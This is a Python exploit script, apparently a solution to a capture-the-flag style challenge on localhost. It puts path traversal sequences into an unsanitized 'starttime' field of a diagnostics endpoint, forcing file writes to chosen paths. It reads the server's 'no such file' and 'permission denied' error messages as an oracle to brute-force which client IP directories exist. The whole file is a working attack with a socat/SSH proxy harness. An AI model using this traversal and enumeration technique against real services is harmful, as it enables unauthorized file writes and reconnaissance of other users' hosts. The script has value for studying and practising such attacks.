#!/usr/bin/env python3
import requests
import logging
from pwn import *

# log = logging.getLogger(__file__)
# log.addHandler(logging.StreamHandler())
# log.setLevel(logging.DEBUG)

# pwntools already has a log, just use that
context.log_level = logging.INFO

URL = "http://localhost:50505/diagnostics"


class IPDirSolver:
    """
    Class to abuse unsanitized input for a filepath like:
    diagnostics/var/logs/commands/by-ip/64/7F/00/02/<unsanitized-starttime-input>.json
    """
    def __init__(self, url):
        self.url = url

        self.msg = {"command_response":
            {
            "id": "00000000-0000-0000-0000-000000000000",
            "starttime": "",
            "endtime": "2023/11/04 18:37:55.67755",
            "cmd":"ps",
            "stdout":"","stderr":"","err":""
            }
        }
        self.socat_process = None
        # the first octet is the same as our starting IP (100), so
        # don't try to use a traversal for that one
        self.known_octets = []
        # bounds for a 100.64.0.0/12
        # could cut out the 100 if the str size was less than 25, but
        # with 25 bytes the filename will always have at least one byte
        # for a filename
        self._octet_bounds = [(100, 100), (64, 79), (0, 255), (1, 254)]
        # found from error messages complaining that string wasn't exactly
        # equal to this
        self._expected_str_size = 25
        # using a requests session means the server can serve multiple times
        # without restarting the ssh session. much speed, such wow
        self._session = requests.session()
        self.written_paths = []
        self._octets_to_calc = len(self._octet_bounds)
        # walk all the way back to the farthest back octet that is being
        # brute forced
        self._initial_path_traversal = "../"*self._octets_to_calc
        self.found_ips = []
        self.tried_ip_count = 0
        self.start_cmds()

    def start_cmds(self):
        """
        A managed socat session that acts as a proxy and lets us read the input
        as it comes in
        """
        self.socat_process = process(["socat",
                                      "tcp-listen:50505,reuseaddr,fork",
                                      "exec:'ssh -o \"IdentitiesOnly=yes\" -i ./id_ed25519 -p 7999 nonroot_user@localhost'"])

    def kill_cmds(self):
        if self.socat_process is not None:
            self.socat_process.kill()

    def fmt_path_traversal_str(self, octet_candidate):
        """
        Generate a path that can trigger the path traversal
        """
        known_octet_dirs = '/'.join(["%02X" % i for i in self.known_octets])
        if known_octet_dirs != '':
            known_octet_dirs += '/'
        log.debug("known_octet_dirs: '%s'", known_octet_dirs)
        genned_path_no_file = "%s%s%02X/" % (self._initial_path_traversal, known_octet_dirs, octet_candidate)
        log.debug("genned_path_no_file: '%s'", genned_path_no_file)
        genned_path_with_file = genned_path_no_file.ljust(self._expected_str_size, "a")
        return genned_path_with_file

    def try_request(self, genned_path):
        """
        Set the field with the starttime directory traversal and
        send a request to the server
        """
        self.tried_ip_count += 1
        self.msg['command_response']['starttime'] = genned_path
        r = self._session.post(self.url, json=self.msg)
        return r

    def test_path_for_valid_directory(self, genned_path):
        """
        Test a single path to determine if the directory is valid.
        reurns a bool to indicate the validity of the tested directory
        """
        r = self.try_request(genned_path)
        if r.status_code == 200:
            # Was able to write to path, found a full IP
            log.success("wrote to path! %s", genned_path)
            self.written_paths.append(genned_path)
            return True

        # need to figure out if the path wasn't valid because the directory
        # doesn't exist or because we have no permissions to write to it
        if r.status_code == 500:
            # get the output from diagserver
            diagserver_log = self.socat_process.recv()
            if diagserver_log.find(b'no such file') != -1:
                # directory doesn't exist, no need to explore it any further
                return False
            if diagserver_log.find(b'permission denied') != -1:
                # directory does exist, just don't have permission to write a
                # file to it. Needs to be explored more
                return True

        raise Exception("Status code wasn't 200 or 500")

    def run(self):
        """
        Do a depth-first-search using recursion testing each ip octet to see if
        a directory matching that octet exists on the server
        """

        # get the allowed bounds for the currently targeted octet
        oct_bounds_start, oct_bounds_end = self._octet_bounds[len(self.known_octets)]

        # generate the string of the current ip (for logging)
        known_oct_ip_str = '.'.join(['%d' % i for i in self.known_octets])

        for oct_candidate in range(oct_bounds_start, oct_bounds_end+1):
            # generate a string to determine whether the current
            # oct_candidate is a vaild directory
            path_to_test = self.fmt_path_traversal_str(oct_candidate)
            # trigger the bug and return whether
            res = self.test_path_for_valid_directory(path_to_test)
            if res is False:
                continue

            if len(self.known_octets) + 1 == self._octets_to_calc:
                found_ip_str = "%s.%d" % (known_oct_ip_str, oct_candidate)
                log.success("found a full IP %s" % found_ip_str)
                self.found_ips.append(found_ip_str)
            else:
                log.success("found a new octet, trying to guess %s.(%d)" % (known_oct_ip_str, oct_candidate))
                self.known_octets.append(oct_candidate)
                self.run()


        log.info("Done trying to guess %s" % known_oct_ip_str)
        if len(self.known_octets):
            self.known_octets.pop()


if __name__ == "__main__":
    ipds = IPDirSolver(URL)
    ipds.run()
    for i in ipds.found_ips:
        log.success("found ip %s" % i)
    log.info("took %d requests", ipds.tried_ip_count)
    ipds.kill_cmds()

